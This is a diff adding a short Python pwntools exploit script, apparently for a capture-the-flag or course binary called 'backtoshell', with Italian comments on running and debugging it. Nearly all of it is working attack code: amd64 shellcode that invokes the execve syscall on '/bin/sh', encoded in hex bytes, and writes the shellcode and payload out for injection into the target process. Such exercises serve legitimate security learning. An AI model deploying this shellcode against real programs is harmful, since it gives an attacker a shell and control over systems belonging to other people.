@@ -1,0 +1,36 @@
+#! /usr/bin/python3
+import sys
+import pwn
+
+#pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
+
+#pwn.run_in_new_terminal('./backtoshell')
+# per runnare il processo in virtual machine e interagirci da fuori:
+# ssh= ssh("username","ip")
+# r= ssh.process("./multistage")                    multistage name of the process
+#r = pwn.process("./backtoshell")
+#pwn.gdb.attach(r, '''
+#b * 0x401140
+#c
+#''' )
+
+shellcode2='''
+mov rbx, rax
+mov rax, 0x3b
+add rbx, 26
+mov rdi, rbx
+xor rsi, rsi
+xor rdx, rdx
+syscall
+
+
+'''
+pwn.context.arch="amd64"
+payload=b'\x2f\x2f\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x90\x90\x90\x90\x90'
+#print( len(pwn.asm(shellcode2)))
+
+#input("waiting")
+#print(len(pwn.asm(shellcode1)))
+#r.send(pwn.asm(shellcode2)+payload)
+#r.interactive()
+sys.stdout.buffer.write(pwn.asm(shellcode2)+payload)
